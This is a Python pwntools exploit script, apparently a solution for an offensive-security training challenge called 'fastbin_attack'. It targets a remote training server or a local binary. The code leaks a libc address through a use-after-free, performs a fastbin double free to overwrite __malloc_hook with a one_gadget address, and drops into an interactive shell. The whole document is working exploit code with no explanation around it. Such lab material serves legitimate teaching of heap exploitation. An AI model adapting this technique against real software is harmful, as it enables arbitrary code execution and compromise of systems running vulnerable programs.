from pwn import *
import time
from socket import htonl

LIBC = ELF("./libc-2.23.so")

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    if "NORMAL" not in args:
        r = process("./fastbin_attack")
        gdb.attach(r, """
        c
        """)
    else:
        r = process("./fastbin_attack")
    #input("wait")
    
else:
    r = remote("bin.training.offdef.it", 10101)

r.recvuntil(b"> ")
print("waited the first menu")

#INTERACTION PRIMITIVES 
def alloc(size):
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(bytes(str(size), 'ascii'))
    print(r.recvline())
    r.recvuntil(b"> ")

def free(index):
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(bytes(str(index), 'ascii'))
    r.recvuntil(b"> ")

def read(index):
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(bytes(str(index), 'ascii'))
    result = r.read(6) + b"\x00\x00"
    r.readline()
    r.recvuntil(b"> ")
    return result

def write(index, toWrite):
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(bytes(str(index), 'ascii'))
    r.recvuntil(b"Content: ")
    r.sendline(toWrite)
    r.recvuntil(b"> ")



alloc(0x100)    #index 0
alloc(0x40)     #index 1
free(0)
#input("wait")
#leaked_libc = b"\x00\x00" + read(0)

leaked_libc = int.from_bytes(read(0), byteorder = 'little')
 
print("LEAKED %#X" %leaked_libc)

alloc(0x60)     #index 2
alloc(0x60)     #index 3
alloc(0x60)     #index 4


free(2)
free(3)  
#input("wait")   
free(2)

alloc(0x60)     #index 5
alloc(0x60)     #index 6

LIBC_OFF = 0X7f8a889c4b78 - 0x7f8a88600000
libc_base = leaked_libc - LIBC_OFF
print(LIBC_OFF)
print("base: %#x" %libc_base)

mall_hook_off = 0x7f3d5a7c4b10 - 0x7f3d5a400000 - 0x23

write(5, p64(mall_hook_off + libc_base))

print("Mall_hook: %#x" %(mall_hook_off + libc_base))

#input("wait")
alloc(0x60)     #index 7

alloc(0x60)

write(8,b"A"*0x13 + (libc_base + 0xf1247).to_bytes(8,byteorder='little'))


r.interactive()